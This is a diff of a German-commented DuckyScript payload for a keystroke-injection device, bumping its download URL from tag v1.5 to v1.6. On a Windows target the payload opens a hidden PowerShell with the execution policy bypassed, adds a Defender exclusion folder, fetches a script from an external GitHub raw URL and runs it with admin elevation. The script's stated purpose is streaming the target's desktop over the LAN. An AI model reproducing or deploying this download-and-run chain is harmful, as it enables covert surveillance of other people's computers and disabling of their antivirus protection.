@@ -6,17 +6,18 @@ REM     Description: Startet auf dem Ziel-Windows einen HTTP-Server und streamt
 REM     den Desktop in einen Browser auf einem anderen Geraet im selben Netz.
 REM     Aufruf am Client: http://<LAN-IP des Ziels>:8080
 REM     Beenden: ESC auf dem Ziel 5 Sekunden gedrueckt halten.
+REM     Beim Start oeffnet das ps1 ein CMD-Fenster mit der Aufruf-URL.
 
 REM     Target: Windows 10/11
 
-REM     Payload: https://raw.githubusercontent.com/cypherfrog112358/hak5-payloads/v1.5/s.ps1
+REM     Payload: https://raw.githubusercontent.com/cypherfrog112358/hak5-payloads/v1.6/s.ps1
 REM     (s.ps1 = identische Kurz-Datei von Screenshare-Over-LAN-fixed.ps1,
 REM      spart 23 Zeichen im 259-Zeichen-Limit)
-REM     Der Tag 'v1.5' ist ABSCHLIESSEND (immutable): der Inhalt dahinter
+REM     Der Tag 'v1.6' ist ABSCHLIESSEND (immutable): der Inhalt dahinter
 REM     kann sich nicht mehr aendern. Das ist wichtig, weil GitHub die
 REM     Raw-Dateien von beweglichen Refs ('main', 'HEAD') zum Teil minutenlang
 REM     aus dem CDN-Cache ausliefert - man laege dann eine alte Version.
-REM     Bei einer neuen Version bekommt das ps1 einen neuen Tag (z. B. v1.6)
+REM     Bei einer neuen Version bekommt das ps1 einen neuen Tag (z. B. v1.7)
 REM     und die URL in diesem Script wird angepasst.
 
 REM     WICHTIG - 259-Zeichen-Limit:
@@ -61,7 +62,7 @@ REM       * Administratorrechte (Firewall, URL-Reservation, Defender-Ausnahme)
 
 GUI r
 DELAY 1200
-STRING powershell -ExecutionPolicy Bypass -w h -c md C:\PS -Force;Add-MpPreference -ExclusionPath 'C:\PS';irm https://raw.githubusercontent.com/cypherfrog112358/hak5-payloads/v1.5/s.ps1 -OutFile C:\PS\x.ps1;& C:\PS\x.ps1
+STRING powershell -ExecutionPolicy Bypass -w h -c md C:\PS -Force;Add-MpPreference -ExclusionPath 'C:\PS';irm https://raw.githubusercontent.com/cypherfrog112358/hak5-payloads/v1.6/s.ps1 -OutFile C:\PS\x.ps1;& C:\PS\x.ps1
 DELAY 800
 CTRL-SHIFT ENTER
 DELAY 3000
